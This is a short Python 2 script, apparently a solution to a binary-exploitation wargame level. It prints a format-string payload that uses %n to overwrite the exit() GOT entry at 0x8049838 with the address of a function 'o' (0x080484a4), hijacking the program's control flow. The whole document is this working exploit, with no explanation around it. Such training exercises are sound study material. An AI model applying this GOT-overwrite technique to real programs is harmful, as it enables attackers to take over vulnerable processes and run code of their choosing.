#!/usr/bin/python2

import struct
# functions main, n, o
# 0x8049838 <exit@got.plt>:  <Change this number>
# o addr == 0x080484a4
fmt = "%1$134513828c%9$n\0  "
got = struct.pack("<I", 0x8049838)
print fmt + got
